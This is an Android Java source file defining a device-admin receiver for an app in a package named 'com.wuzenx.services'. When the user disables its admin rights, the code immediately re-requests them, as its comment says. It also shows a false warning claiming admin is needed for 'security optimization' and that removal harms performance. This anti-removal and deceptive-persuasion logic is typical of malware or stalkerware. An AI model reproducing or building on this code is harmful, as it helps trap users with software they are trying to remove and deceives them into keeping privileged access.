package com.wuzenx.services;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {}
    
    @Override
    public void onDisabled(Context context, Intent intent) {
        // Immediately re-request admin when user tries to remove
        Intent reEnable = new Intent(DeviceAdminReceiver.ACTION_DEVICE_ADMIN_ENABLE);
        reEnable.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(reEnable);
    }
    
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "This application requires device admin for security optimization. " +
               "Disabling it may compromise device performance.";
    }
}
